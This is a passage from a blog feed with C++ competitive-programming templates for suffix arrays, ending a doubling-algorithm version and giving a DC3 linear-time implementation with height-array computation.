class="title">calheight</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> *sa,<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i,j,k=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++) rak[sa[i]]=i;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;height[rak[i++]]=k)</span><br><span class="line">     <span class="keyword">for</span>(k?k--:<span class="number">0</span>,j=sa[rak[i]<span class="number">-1</span>];r[i+k]==r[j+k];k++);</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--)rak[i]=rak[i<span class="number">-1</span>],sa[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cas=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    cin&gt;&gt;k;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s+<span class="number">1</span>))&#123;</span><br><span class="line">        n=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">            cal[i]=s[i];</span><br><span class="line">        cal[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">da</span>(cal+<span class="number">1</span>,sa,n+<span class="number">1</span>,<span class="number">200</span>);</span><br><span class="line">        <span class="built_in">calheight</span>(cal+<span class="number">1</span>,sa,n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,height[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,sa[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,rak[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            ans+=rak[i]-height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DC3算法-O-n"><a href="#DC3算法-O-n" class="headerlink" title="DC3算法(O(n))"></a>DC3算法(O(n))</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x) ((x) / 3 + ((x) % 3 == 1 ? 0 : tb))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G(x) ((x) &lt; tb ? (x) * 3 + 1 : ((x) - tb) * 3 + 2)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">3</span>*(<span class="number">1e5</span>+<span class="number">5</span>);</span><br><span class="line"><span class="keyword">int</span> wa[N], wb[N], ws[N], wv[N], sa[N];</span><br><span class="line"><span class="keyword">int</span> rak[N], height[N], cal[N],n;</span><br><span class="line"><span class="keyword">char</span> s[N],ans[N],s1[N];</span><br><span class="line"><span class="keyword">int</span> cnt[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">c0</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> r[a] == r[b] &amp;&amp; r[a + <span class="number">1</span>] == r[b + <span class="number">1</span>] &amp;&amp; r[a + <span class="number">2</span>] == r[b + <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">c12</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> *r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> r[a] &lt; r[b] || r[a] == r[b] &amp;&amp; <span class="built_in">c12</span>(<span class="number">1</span>, r, a + <span class="number">1</span>, b + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> r[a] &lt; r[b] || r[a] == r[b] &amp;&amp; wv[a + <span class="number">1</span>] &lt; wv[b + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Rsort</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *a, <span class="keyword">int</span> *b, <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) wv[i] = r[a[i]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) ws[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) ws[wv[i]]++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++) ws[i] += ws[i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) b[--ws[wv[i]]] = a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dc3</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *sa, <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, *rn = r + n, *san = sa + n, ta = <span class="number">0</span>, tb = (n + <span class="number">1</span>) / <span class="number">3</span>, tbc = <span class="number">0</span>, p;</span><br><span class="line">    r[n] = r[n + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) <span class="keyword">if</span> (i % <span class="number">3</span> != <span class="number">0</span>) wa[tbc++] = i;</span><br><span class="line">    <span class="built_in">Rsort</span>(r + <span class="number">2</span>, wa, wb, tbc, m);</span><br><span class="line">    <span class="built_in">Rsort</span>(r + <span class="number">1</span>, wb, wa, tbc, m);</span><br><span class="line">    <span class="built_in">Rsort</span>(r, wa, wb, tbc, m);</span><br><span class="line">    <span class="keyword">for</span> (p = <span class="number">1</span>, rn[<span class="built_in">F</span>(wb[<span class="number">0</span>])] = <span class="number">0</span>, i = <span class="number">1</span>; i &lt; tbc; i++)</span><br><span class="line">        rn[<span class="built_in">F</span>(wb[i])] = <span class="built_in">c0</span>(r, wb[i - <span class="number">1</span>], wb[i]) ? p - <span class="number">1</span> : p++;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; tbc) <span class="built_in">dc3</span>(rn, san, tbc, p);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) san[rn[i]] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) <span class="keyword">if</span> (san[i] &lt; tb) wb[ta++] = san[i] * <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">1</span>) wb[ta++] = n - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">Rsort</span>(r, wb, wa, ta, m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) wv[wb[i] = <span class="built_in">G</span>(san[i])] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>, p = <span class="number">0</span>; i &lt; ta &amp;&amp; j &lt; tbc; p++)</span><br><span class="line">        sa[p] = <span class="built_in">c12</span>(wb[j] % <span class="number">3</span>, r, wa[i], wb[j]) ? wa[i++] : wb[j++];</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; ta; p++) sa[p] = wa[i++];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt; tbc; p++) sa[p] = wb[j++];</span><br><span class="line">    <span class="comment">//for(int i=n;i;i--) rak[i]=rak[i-1];</span></span><br><span class="line">    <span class="comment">//for(int i=n;i;i--) sa[i]++;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calheight</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *sa, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) rak[sa[i]] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; height[rak[i++]] = k)</span><br><span class="line">        <span class="keyword">for</span> (k ? k-- : <span class="number">0</span>, j = sa[rak[i] - <span class="number">1</span>]; r[i + k] == r[j + k]; k++);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--) rak[i]=rak[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--) sa[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s+<span class="number">1</span>)&amp;&amp;s[<span class="number">1</span>] != <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">        n = <span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">            cal[i] = s[i] - <span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>;</span><br><span class="line">        cal[n+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">dc3</span>(cal+<span class="number">1</span>, sa, n + <span class="number">1</span>, <span class="number">30</span>);</span><br><span class="line">        <span class="built_in">calheight</span>(cal+<span class="number">1</span>, sa, n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,height[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;本篇博客只有板子。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="字符串" scheme="http://example.com/categories/icpc/%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
    <category term="SA" scheme="http://example.com/categories/icpc/%E5%AD%97%E7%AC%A6%E4%B8%B2/SA/"/>
    
    
  </entry>
  
</feed>
